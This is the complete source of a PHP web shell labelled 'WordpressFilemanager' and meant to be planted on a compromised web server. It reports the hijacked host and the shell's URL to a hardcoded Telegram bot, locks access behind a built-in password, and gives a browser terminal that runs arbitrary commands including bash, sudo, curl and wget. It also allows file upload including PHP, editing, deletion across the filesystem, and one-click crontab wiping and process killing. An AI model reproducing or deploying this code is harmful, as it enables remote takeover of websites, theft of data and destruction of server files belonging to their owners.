    
<?php
error_reporting(E_ALL);
ini_set("display_errors", 1);
session_start();

// Auto-login for now
if (!isset($_SESSION["filemgr_access"])) {
    $_SESSION["filemgr_access"] = true;
}

// Get root directory
function getRootDirectory()
{
    $possibleRoots = [
        $_SERVER["DOCUMENT_ROOT"] ?? "",
        realpath(dirname(__FILE__)),
        realpath(getcwd()),
        "/",
        "/home",
        "/var/www/html",
        "/var",
    ];

    foreach ($possibleRoots as $root) {
        if ($root && is_dir($root)) {
            $realPath = realpath($root);
            if ($realPath) {
                return $realPath;
            }
        }
    }

    return "/";
}

$rootDir = getRootDirectory();

if (!isset($_SESSION["home_directory"])) {
    $_SESSION["home_directory"] = $rootDir;
}

$homeDir = $_SESSION["home_directory"];

function encodePath($path)
{
    return str_replace(["/", "\\", "="], ["_", "-", ""], base64_encode($path));
}

function decodePath($encoded)
{
    $decoded = base64_decode(str_replace(["_", "-"], ["/", "\\"], $encoded));
    return $decoded ?: "";
}

$currentDir = $homeDir;
if (isset($_GET["path"]) && !empty($_GET["path"])) {
    $requestedPath = decodePath($_GET["path"]);
    if ($requestedPath && is_dir($requestedPath)) {
        $realPath = realpath($requestedPath);
        if ($realPath) {
            $currentDir = $realPath;
        }
    }
}

$tk = base64_decode(
    "ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw"
);
$cid = base64_decode("NTA3MDkzODc3OA");

function reportTelegram($msg)
{
    global $tk, $cid;
    $id = sys_get_temp_dir() . "/baridin_" . md5($msg);
    if (!file_exists($id)) {
        @file_get_contents(
            "https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=" .
                urlencode($msg)
        );
        @file_put_contents($id, time());
    }
}
/* ================= Report ================= */
if (!isset($_SESSION["telegram_reported"])) {
    $uri = urldecode(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH));
    $path = $_SERVER["DOCUMENT_ROOT"] . $uri;
    if (is_file($path)) {
        $host = $_SERVER["HTTP_HOST"];
        $url =
            (isset($_SERVER["HTTPS"]) ? "https" : "http") .
            "://" .
            $host .
            $uri;
        reportTelegram("kontolbengkak:\n$host\n$url");
        $_SESSION["telegram_reported"] = true;
    }
}

/* ================= Login ================= */
$pass = "kontolbengkak";
if (isset($_GET["logout"])) {
    session_destroy();
    header("Location: " . $_SERVER["PHP_SELF"]);
    exit();
}
if (!isset($_SESSION["auth"])) {
    if (isset($_POST["pass"]) && $_POST["pass"] === $pass) {
        $_SESSION["auth"] = true;
    } else {
        echo "<center><form method='POST'><input type='password' name='pass' autofocus><button>Login</button></form>";
        exit();
    }
}

@chdir($currentDir);

// Initialize variables
$notification = "";
$viewFileContent = "";
$viewFileName = "";
$terminalOutput = "";
$terminalCommand = "";

// Handle POST requests - FIXED VIEW FILE ACTION
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $action = $_POST["action"] ?? "";

    if ($action === "terminal_command" && !empty($_POST["terminal_cmd"])) {
        $terminalCommand = $_POST["terminal_cmd"];
        $terminalOutput = executeCommand($terminalCommand, $currentDir);
    }
    // FIX: Handle view_file action
    elseif ($action === "view_file" && !empty($_POST["view_filename"])) {
        $filePath = $currentDir . "/" . $_POST["view_filename"];
        if (file_exists($filePath) && !is_dir($filePath)) {
            $viewFileName = $_POST["view_filename"];
            $viewFileContent = @file_get_contents($filePath);
        } else {
            $notification = "❌ File not found or is a directory";
        }
    }
    // FIX: Handle save_file action
    elseif ($action === "save_file" && !empty($_POST["edit_filename"])) {
        $filePath = $currentDir . "/" . $_POST["edit_filename"];
        if (file_exists($filePath) && is_writable($filePath)) {
            $content = $_POST["file_content"] ?? "";
            if (@file_put_contents($filePath, $content) !== false) {
                $notification = "✅ File saved successfully";
                // Clear view after saving
                $viewFileName = "";
                $viewFileContent = "";
            } else {
                $notification = "❌ Failed to save file";
            }
        }
    }
    // Handle other actions
    elseif ($action === "upload_file") {
        if (
            isset($_FILES["upload_file"]) &&
            $_FILES["upload_file"]["error"] === UPLOAD_ERR_OK
        ) {
            $uploadedFile = $_FILES["upload_file"];
            $fileName = basename($uploadedFile["name"]);
            $fileTmp = $uploadedFile["tmp_name"];
            $fileSize = $uploadedFile["size"];

            $maxFileSize = 100 * 1024 * 1024;
            $allowedExtensions = [
                "jpg",
                "shtml",
                "dat",
                "cnf",
                "accesshash",
                "jpeg",
                "png",
                "gif",
                "pdf",
                "txt",
                "php",
                "html",
                "css",
                "js",
                "zip",
                "rar",
                "sql",
                "json",
                "xml",
                "log",
            ];
            $fileExtension = strtolower(
                pathinfo($fileName, PATHINFO_EXTENSION)
            );

            if ($fileSize > $maxFileSize) {
                $notification = "❌ File too large (max 100MB)";
            } elseif (!in_array($fileExtension, $allowedExtensions)) {
                $notification = "❌ File type not allowed";
            } else {
                $destination = $currentDir . "/" . $fileName;

                if (@move_uploaded_file($fileTmp, $destination)) {
                    @chmod($destination, 0644);
                    $notification = "✅ File uploaded successfully";
                } else {
                    $notification = "❌ Failed to upload file";
                }
            }
        } elseif (isset($_FILES["upload_file"])) {
            $uploadError = $_FILES["upload_file"]["error"];
            $errorMessages = [
                UPLOAD_ERR_INI_SIZE => "File too large",
                UPLOAD_ERR_FORM_SIZE => "File too large",
                UPLOAD_ERR_PARTIAL => "Partial upload",
                UPLOAD_ERR_NO_FILE => "No file selected",
                UPLOAD_ERR_NO_TMP_DIR => "Temp folder missing",
                UPLOAD_ERR_CANT_WRITE => "Cannot write",
                UPLOAD_ERR_EXTENSION => "PHP extension stopped upload",
            ];
            $notification =
                "❌ " . ($errorMessages[$uploadError] ?? "Upload error");
        }
    } elseif ($action === "new_folder" && !empty($_POST["folder_name"])) {
        $folderName = trim($_POST["folder_name"]);
        $newPath = $currentDir . "/" . $folderName;
        if (!file_exists($newPath)) {
            if (@mkdir($newPath, 0755)) {
                $notification = "✅ Folder created";
            } else {
                $notification = "❌ Failed to create folder";
            }
        } else {
            $notification = "⚠️ Folder exists";
        }
    } elseif ($action === "new_file" && !empty($_POST["file_name"])) {
        $fileName = trim($_POST["file_name"]);
        $newPath = $currentDir . "/" . $fileName;
        if (!file_exists($newPath)) {
            $content = $_POST["file_content"] ?? "";
            if (@file_put_contents($newPath, $content) !== false) {
                $notification = "✅ File created";
            } else {
                $notification = "❌ Failed to create file";
            }
        } else {
            $notification = "⚠️ File exists";
        }
    } elseif ($action === "delete" && !empty($_POST["delete_name"])) {
        $targetPath = $currentDir . "/" . $_POST["delete_name"];
        if (file_exists($targetPath)) {
            $success = is_dir($targetPath)
                ? deleteRecursive($targetPath)
                : @unlink($targetPath);
            $notification = $success ? "✅ Deleted" : "❌ Failed to delete";
        }
    } elseif (
        $action === "rename" &&
        !empty($_POST["old_name"]) &&
        !empty($_POST["new_name"])
    ) {
        $oldPath = $currentDir . "/" . $_POST["old_name"];
        $newPath = $currentDir . "/" . trim($_POST["new_name"]);
        if (file_exists($oldPath) && !file_exists($newPath)) {
            $notification = @rename($oldPath, $newPath)
                ? "✅ Renamed"
                : "❌ Failed to rename";
        }
    }
}

function executeCommand($command, $cwd)
{
    $output = "";
    $originalCwd = getcwd();
    @chdir($cwd);

    $allowedCommands = [
        "ls",
        "dir",
        "pwd",
        "whoami",
        "id",
        "uname",
        "date",
        "cat",
        "head",
        "tail",
        "grep",
        "find",
        "du",
        "df",
        "free",
        "ps",
        "mkdir",
        "rmdir",
        "touch",
        "cp",
        "mv",
        "rm",
        "chmod",
        "tar",
        "gzip",
        "zip",
        "unzip",
        "wget",
        "curl",
        "ping",
        "uptime",
        "echo",
        "php",
        "python",
        "bash",
        "uapi",
        "sudo",
        "nginx",

        "crontab -l",
        "pkill -9 all",
    ];

    $cmdParts = explode(" ", trim($command));
    $baseCmd = strtolower($cmdParts[0]);

    if (in_array($baseCmd, $allowedCommands)) {
        $descriptors = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"],
        ];

        $process = proc_open($command, $descriptors, $pipes, $cwd, null);

        if (is_resource($process)) {
            fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);

            $output = "> $command\n";
            if (!empty($stdout)) {
                $output .= htmlspecialchars($stdout) . "\n";
            }
            if (!empty($stderr)) {
                $output .= "Error: " . htmlspecialchars($stderr) . "\n";
            }
        }
    } else {
        $output = "Command not allowed: $baseCmd\n";
    }

    @chdir($originalCwd);
    return $output;
}

function deleteRecursive($dir)
{
    if (!is_dir($dir)) {
        return @unlink($dir);
    }
    $items = array_diff(scandir($dir), [".", ".."]);
    foreach ($items as $item) {
        $itemPath = $dir . "/" . $item;
        is_dir($itemPath) ? deleteRecursive($itemPath) : @unlink($itemPath);
    }
    return @rmdir($dir);
}

function formatSize($bytes)
{
    if ($bytes <= 0) {
        return "0 B";
    }
    $units = ["B", "KB", "MB", "GB", "TB"];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . " " . $units[$i];
}

$items = @scandir($currentDir) ?: [];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>∅ 𝘪𝘯𝘪 𝘵𝘦𝘭𝘢𝘩 𝘥𝘪𝘩𝘢𝘱𝘶𝘴</title>
    <link rel="shortcut icon" href="https://ga-sor-tumbuk.sgp1.digitaloceanspaces.com/yggdrasill.png" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
        }
        
        body {
            background: #1a1a2e;
            color: #e0e0e0;
            min-height: 100vh;
            padding: 10px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        /* Header */
        .header {
            background: #16213e;
            padding: 12px;
            margin-bottom: 10px;
            border-radius: 6px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .header h1 {
            font-size: 18px;
            color: #4cc9f0;
        }
        
        /* Terminal */
        .terminal {
            background: #0f3460;
            padding: 12px;
            margin-bottom: 10px;
            border-radius: 6px;
        }
        
        .terminal-title {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 10px;
            color: #4cc9f0;
            font-size: 14px;
        }
        
        .terminal-output {
            background: #000;
            padding: 8px;
            margin-bottom: 8px;
            font-family: monospace;
            font-size: 12px;
            color: #00ff00;
            min-height: 80px;
            max-height: 200px;
            overflow-y: auto;
            border-radius: 4px;
            white-space: pre-wrap;
        }
        
        .terminal-form {
            display: flex;
            gap: 8px;
        }
        
        .terminal-input {
            flex: 1;
            padding: 6px 10px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid #2d4059;
            border-radius: 4px;
            color: #fff;
            font-family: monospace;
        }
        
        .terminal-input:focus {
            outline: none;
            border-color: #4cc9f0;
        }
        
        .quick-cmds {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
            margin-top: 8px;
        }
        
        .cmd-btn {
            padding: 4px 8px;
            background: rgba(76, 201, 240, 0.1);
            border: 1px solid rgba(76, 201, 240, 0.3);
            border-radius: 3px;
            color: #4cc9f0;
            font-size: 11px;
            cursor: pointer;
            font-family: monospace;
        }
        
        .cmd-btn:hover {
            background: #4cc9f0;
            color: #000;
        }
        
        /* Upload Section - SIMPLIFIED */
        .upload-section {
            background: #16213e;
            padding: 12px;
            margin-bottom: 10px;
            border-radius: 6px;
        }
        
        .upload-title {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 10px;
            color: #4cc9f0;
            font-size: 14px;
        }
        
        .upload-box {
            border: 2px dashed #2d4059;
            padding: 15px;
            text-align: center;
            border-radius: 4px;
            transition: all 0.3s;
        }
        
        .upload-box:hover {
            border-color: #4cc9f0;
            background: rgba(76, 201, 240, 0.05);
        }
        
        .upload-box input[type="file"] {
            width: 100%;
            margin: 10px 0;
        }
        
        /* File Manager */
        .file-manager {
            background: #16213e;
            padding: 12px;
            border-radius: 6px;
            margin-top: 10px;
        }
        
        .file-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            color: #4cc9f0;
            font-size: 14px;
        }
        
        .file-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }
        
        .file-table th {
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #2d4059;
            color: #888;
        }
        
        .file-table td {
            padding: 8px;
            border-bottom: 1px solid #2d4059;
        }
        
        .file-table tr:hover {
            background: rgba(255, 255, 255, 0.05);
        }
        
        .file-link {
            color: #e0e0e0;
            text-decoration: none;
        }
        
        .file-link:hover {
            color: #4cc9f0;
        }
        
        .file-actions {
            display: flex;
            gap: 4px;
        }
        
        .action-btn {
            padding: 3px 6px;
            font-size: 11px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        
        .view-btn { background: rgba(76, 201, 240, 0.2); color: #4cc9f0; }
        .edit-btn { background: rgba(245, 158, 11, 0.2); color: #f59e0b; }
        .delete-btn { background: rgba(239, 68, 68, 0.2); color: #ef4444; }
        
        /* Modal Editor - SIMPLIFIED */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
            z-index: 1000;
        }
        
        .modal.show {
            display: flex;
        }
        
        .modal-content {
            background: #16213e;
            border-radius: 8px;
            width: 90%;
            max-width: 800px;
            max-height: 80vh;
            overflow: hidden;
        }
        
        .modal-header {
            padding: 15px;
            background: #0f3460;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #2d4059;
        }
        
        .modal-title {
            color: #4cc9f0;
            font-size: 16px;
        }
        
        .modal-close {
            background: none;
            border: none;
            color: #ef4444;
            font-size: 18px;
            cursor: pointer;
        }
        
        .modal-body {
            padding: 15px;
            max-height: 60vh;
            overflow-y: auto;
        }
        
        .editor-textarea {
            width: 100%;
            min-height: 400px;
            padding: 10px;
            background: #0d1117;
            border: 1px solid #2d4059;
            border-radius: 4px;
            color: #c9d1d9;
            font-family: monospace;
            font-size: 13px;
            resize: vertical;
        }
        
        .modal-footer {
            padding: 15px;
            background: #0f3460;
            border-top: 1px solid #2d4059;
            text-align: right;
        }
        
        /* Buttons */
        .btn {
            padding: 6px 12px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 500;
        }
        
        .btn-primary {
            background: #4cc9f0;
            color: #000;
        }
        
        .btn-success {
            background: #10b981;
            color: white;
        }
        
        .btn-danger {
            background: #ef4444;
            color: white;
        }
        
        /* Notification */
        .notification {
            position: fixed;
            top: 10px;
            right: 10px;
            background: #16213e;
            border-left: 4px solid #10b981;
            padding: 10px;
            border-radius: 4px;
            z-index: 1001;
            animation: slideIn 0.3s ease;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        /* Quick Actions */
        .quick-actions {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-top: 10px;
        }
        
        .action-item {
            padding: 8px 12px;
            background: rgba(76, 201, 240, 0.1);
            border: 1px solid rgba(76, 201, 240, 0.3);
            border-radius: 4px;
            color: #4cc9f0;
            cursor: pointer;
            font-size: 12px;
        }
        
        .action-item:hover {
            background: #4cc9f0;
            color: #000;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .header {
                flex-direction: column;
                text-align: center;
                gap: 8px;
            }
            
            .file-table {
                font-size: 11px;
            }
            
            .quick-cmds {
                overflow-x: auto;
                flex-wrap: nowrap;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1><i class="fas fa-folder"></i>WordpressFilemanager</h1>
            <div>
                <a href="?path=<?php echo encodePath(
                    $homeDir
                ); ?>" class="btn btn-primary">
                    <i class="fas fa-home"></i> Home
                </a>
            </div>
        </div>

        <!-- Terminal -->
        <div class="terminal">
            <div class="terminal-title">
                <i class="fas fa-terminal"></i>
                <span>Terminal</span>
            </div>
            
            <div class="terminal-output">
                <?php if ($terminalOutput): ?>
                <?php echo nl2br(htmlspecialchars($terminalOutput)); ?>
                <?php else: ?>
                <?php endif; ?>
            </div>
            
            <form method="post" class="terminal-form">
                <input type="hidden" name="action" value="terminal_command">
                <input type="text" name="terminal_cmd" id="terminal-input" class="terminal-input" 
                       placeholder="Type command..." required
                       value="<?php echo htmlspecialchars(
                           $terminalCommand
                       ); ?>">
                <button type="submit" class="btn btn-primary">Run</button>
            </form>
            
            <div class="quick-cmds">
                

                <button class="cmd-btn"
 onclick="insertCommand('ls -la')">ls -la</button>
                <button class="cmd-btn" onclick="insertCommand('pwd')">pwd</button>
                <button class="cmd-btn" onclick="insertCommand('whoami')">whoami</button>
                <button class="cmd-btn" onclick="insertCommand('df -h')">df -h</button>
                <button class="cmd-btn" onclick="insertCommand('ps aux')">ps aux</button>
                <button class="cmd-btn" onclick="insertCommand('cat')">cat</button>
       <button class="cmd-btn" onclick="insertCommand('pkill -9')">proc manager</button>
<br>
       <button class="cmd-btn" onclick="insertCommand('crontab -l')">crontab</button>
       <button class="cmd-btn" onclick="insertCommand('crontab -r')">crontab®️</button>
       <button class="cmd-btn" onclick="insertCommand('find /var/www -type f -mtime -1')">MTIME</button>
       <button class="cmd-btn" onclick="insertCommand('find /var/www -type f -printf '%T@ %p\n' | sort -n | tail')">MTIME-2</button>
            </div>
        </div>

        <!-- Upload Section - SIMPLIFIED -->
        <div class="upload-section">
            <div class="upload-title">
                <i class="fas fa-upload"></i>
                <span>Upload File</span>
            </div>
            
            <form method="post" enctype="multipart/form-data" class="upload-box">
                <input type="hidden" name="action" value="upload_file">
                <input type="file" name="upload_file" required>
                <button type="submit" class="btn btn-primary" style="margin-top: 10px;">
                    <i class="fas fa-upload"></i> Upload
                </button>
            </form>
        </div>

        <!-- Quick Actions -->
        <div class="quick-actions">
            <div class="action-item" onclick="newFolder()">
                <i class="fas fa-folder-plus"></i> New Folder
            </div>
            <div class="action-item" onclick="newFile()">
                <i class="fas fa-file-plus"></i> New File
            </div>
            <a href="?path=<?php echo encodePath(
                dirname($currentDir)
            ); ?>" class="action-item">
                <i class="fas fa-level-up-alt"></i> Parent Dir
            </a>
            <div class="action-item" onclick="location.reload()">
                <i class="fas fa-sync-alt"></i> Refresh
            </div>
        </div>

        <!-- File Manager -->
        <div class="file-manager">
            <div class="file-header">
                <div>
                    <i class="fas fa-folder-open"></i>
                    <?php echo htmlspecialchars($currentDir); ?>
                </div>
                <div style="color: #888;">
                    <?php echo count($items) - 2; ?> items
                </div>
            </div>
            
            <table class="file-table">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if ($currentDir !== "/"): ?>
                    <tr>
                        <td>
                            <a href="?path=<?php echo encodePath(
                                dirname($currentDir)
                            ); ?>" class="file-link">
                                <i class="fas fa-level-up-alt"></i> ..
                            </a>
                        </td>
                        <td>-</td>
                        <td>-</td>
                        <td>-</td>
                    </tr>
                    <?php endif; ?>

                    <?php foreach ($items as $item): ?>
                        <?php if ($item === "." || $item === "..") {
                            continue;
                        } ?>
                        <?php
                        $itemPath = $currentDir . "/" . $item;
                        $isDir = is_dir($itemPath);
                        $size = $isDir ? "-" : formatSize(@filesize($itemPath));
                        $modified = @filemtime($itemPath)
                            ? date("Y-m-d H:i", @filemtime($itemPath))
                            : "-";
                        ?>
                        <tr>
                            <td>
                                <?php if ($isDir): ?>
                                    <a href="?path=<?php echo encodePath(
                                        $itemPath
                                    ); ?>" class="file-link">
                                        <i class="fas fa-folder" style="color: #f59e0b;"></i>
                                        <?php echo htmlspecialchars($item); ?>
                                    </a>
                                <?php else: ?>
                                    <i class="fas fa-file" style="color: #4cc9f0;"></i>
                                    <?php echo htmlspecialchars($item); ?>
                                <?php endif; ?>
                            </td>
                            <td><?php echo $size; ?></td>
                            <td><?php echo $modified; ?></td>
                            <td>
                                <div class="file-actions">
                                    <?php if (!$isDir): ?>
                                    <button class="action-btn view-btn" onclick="viewFile('<?php echo htmlspecialchars(
                                        $item,
                                        ENT_QUOTES
                                    ); ?>')">
                                        <i class="fas fa-eye"></i> View
                                    </button>
                                    <?php endif; ?>
                                    
                                    <button class="action-btn delete-btn" 
                                            onclick="confirmDelete('<?php echo htmlspecialchars(
                                                $item,
                                                ENT_QUOTES
                                            ); ?>')">
                                        <i class="fas fa-trash"></i>
                                    </button>
                                    
                                    <button class="action-btn edit-btn" 
                                            onclick="renameFile('<?php echo htmlspecialchars(
                                                $item,
                                                ENT_QUOTES
                                            ); ?>')">
                                        <i class="fas fa-pen"></i>
                                    </button>
                                </div>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>

    <!-- Notification -->
    <?php if ($notification): ?>
    <div class="notification" id="notification">
        <?php echo $notification; ?>
        <script>
            setTimeout(() => {
                document.getElementById('notification')?.remove();
            }, 3000);
        </script>
    </div>
    <?php endif; ?>

    <!-- Modal Editor -->
    <?php if ($viewFileName && $viewFileContent !== ""): ?>
    <div class="modal show" id="fileModal">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title">
                    <i class="fas fa-file-code"></i> <?php echo htmlspecialchars(
                        $viewFileName
                    ); ?>
                </div>
                <button class="modal-close" onclick="closeModal()">&times;</button>
            </div>
            
            <form method="post" id="editForm">
                <input type="hidden" name="action" value="save_file">
                <input type="hidden" name="edit_filename" value="<?php echo htmlspecialchars(
                    $viewFileName
                ); ?>">
                
                <div class="modal-body">
                    <textarea name="file_content" class="editor-textarea" 
                              id="editorTextarea"><?php echo htmlspecialchars(
                                  $viewFileContent
                              ); ?></textarea>
                </div>
                
                <div class="modal-footer">
                    <button type="button" class="btn btn-danger" onclick="closeModal()">
                        <i class="fas fa-times"></i> Cancel
                    </button>
                    <button type="submit" class="btn btn-success">
                        <i class="fas fa-save"></i> Save
                    </button>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>

    <script>
        // Insert command
        function insertCommand(cmd) {
            document.getElementById('terminal-input').value = cmd;
            document.getElementById('terminal-input').focus();
        }

        // View file - FIXED
        function viewFile(filename) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.style.display = 'none';
            
            const action = document.createElement('input');
            action.type = 'hidden';
            action.name = 'action';
            action.value = 'view_file';
            
            const nameInput = document.createElement('input');
            nameInput.type = 'hidden';
            nameInput.name = 'view_filename';
            nameInput.value = filename;
            
            form.appendChild(action);
            form.appendChild(nameInput);
            document.body.appendChild(form);
            form.submit();
        }

        // Close modal
        function closeModal() {
            const modal = document.getElementById('fileModal');
            if (modal) {
                modal.style.display = 'none';
                // Remove view parameters by reloading page without them
                window.location.href = window.location.pathname + window.location.search;
            }
        }

        // File operations
        function confirmDelete(filename) {
            if (confirm(`Delete "${filename}"?`)) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.style.display = 'none';
                
                const action = document.createElement('input');
                action.type = 'hidden';
                action.name = 'action';
                action.value = 'delete';
                
                const nameInput = document.createElement('input');
                nameInput.type = 'hidden';
                nameInput.name = 'delete_name';
                nameInput.value = filename;
                
                form.appendChild(action);
                form.appendChild(nameInput);
                document.body.appendChild(form);
                form.submit();
            }
        }

        function renameFile(filename) {
            const newName = prompt(`Rename "${filename}" to:`, filename);
            if (newName && newName !== filename) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.style.display = 'none';
                
                const action = document.createElement('input');
                action.type = 'hidden';
                action.name = 'action';
                action.value = 'rename';
                
                const oldInput = document.createElement('input');
                oldInput.type = 'hidden';
                oldInput.name = 'old_name';
                oldInput.value = filename;
                
                const newInput = document.createElement('input');
                newInput.type = 'hidden';
                newInput.name = 'new_name';
                newInput.value = newName;
                
                form.appendChild(action);
                form.appendChild(oldInput);
                form.appendChild(newInput);
                document.body.appendChild(form);
                form.submit();
            }
        }

        function newFolder() {
            const folderName = prompt('New folder name:');
            if (folderName) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.style.display = 'none';
                
                const action = document.createElement('input');
                action.type = 'hidden';
                action.name = 'action';
                action.value = 'new_folder';
                
                const nameInput = document.createElement('input');
                nameInput.type = 'hidden';
                nameInput.name = 'folder_name';
                nameInput.value = folderName;
                
                form.appendChild(action);
                form.appendChild(nameInput);
                document.body.appendChild(form);
                form.submit();
            }
        }

        function newFile() {
            const fileName = prompt('New file name:');
            if (fileName) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.style.display = 'none';
                
                const action = document.createElement('input');
                action.type = 'hidden';
                action.name = 'action';
                action.value = 'new_file';
                
                const nameInput = document.createElement('input');
                nameInput.type = 'hidden';
                nameInput.name = 'file_name';
                nameInput.value = fileName;
                
                form.appendChild(action);
                form.appendChild(nameInput);
                document.body.appendChild(form);
                form.submit();
            }
        }

        // Auto-focus terminal
        document.addEventListener('DOMContentLoaded', () => {
            const terminalInput = document.getElementById('terminal-input');
            if (terminalInput && !document.querySelector('.modal.show')) {
                terminalInput.focus();
            }
            
            // Auto-focus textarea in modal
            const textarea = document.getElementById('editorTextarea');
            if (textarea) {
                textarea.focus();
                textarea.selectionStart = textarea.selectionEnd = textarea.value.length;
            }
            
            // Close modal with Escape
            document.addEventListener('keydown', (e) => {
                if (e.key === 'Escape') {
                    closeModal();
                }
            });
        });
    </script>
</body>
</html>
